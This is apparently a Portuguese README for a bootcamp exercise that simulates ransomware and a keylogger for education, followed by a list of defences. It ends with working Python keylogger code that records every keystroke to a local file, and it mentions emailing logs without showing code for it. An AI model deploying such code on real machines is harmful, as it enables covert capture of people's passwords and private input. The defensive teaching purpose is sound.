# Projeto_bootcamp_cyberseguranca
Bootcamp cybersec Riachuelo
# 🛡️ Simulador de Malware para Fins Educacionais (Python)

Este projeto foi desenvolvido como parte de um desafio prático da **DIO**, com o objetivo de entender o funcionamento técnico de ameaças digitais como **Ransomwares** e **Keyloggers** para fortalecer estratégias de defesa.

> **AVISO DE SEGURANÇA:** Este código foi criado estritamente para fins educacionais em ambiente controlado. O uso malintencionado de técnicas de hacking é ilegal e antiético.

---

##  Estrutura do Projeto

* `ransomware_sim.py`: Script que demonstra a criptografia e descriptografia de arquivos.
* `keylogger_sim.py`: Script que captura teclas digitadas e salva em um log local.
* `targets/`: Pasta contendo arquivos de teste para a simulação.

---

## Tecnologias Utilizadas
* **Linguagem:** Python 3.x
* **Bibliotecas:** * `cryptography` (Fernet) para o Ransomware.
    * `pynput` para captura de teclado no Keylogger.

---

##  Demonstração dos Scripts

### 1. Ransomware Simulado
O script utiliza a biblioteca `cryptography` para gerar uma chave simétrica, criptografar arquivos de texto e, posteriormente, realizar a reversão (descriptografia).

**Comando para rodar:**
```bash
python ransomware_sim.py

2. Keylogger Simulado
O script monitora as entradas do teclado e as armazena em um arquivo log.txt. No cenário real, discutimos como esses dados poderiam ser enviados via smtplib (e-mail).

Comando para rodar:

Bash
python keylogger_sim.py
🛡️ Medidas de Defesa e Prevenção
Com base nos experimentos, as principais defesas identificadas são:

Backups Offline: A única defesa 100% eficaz contra o sequestro de dados (Ransomware).

Antivírus e EDR: Ferramentas que detectam comportamentos suspeitos de hooks de teclado ou processos de criptografia em massa.

Princípio do Privilégio Mínimo: Usuários não devem ter permissão de escrita em diretórios críticos do sistema.

Conscientização: A maioria dessas ameaças chega via Phishing.

from pynput.keyboard import Listener

log_file = "log_teclas.txt"

def on_press(key):
    with open(log_file, "a") as f:
        f.write(f"{key}\n")

print("Keylogger rodando... Pressione Ctrl+C para parar.")
with Listener(on_press=on_press) as listener:
    listener.join()
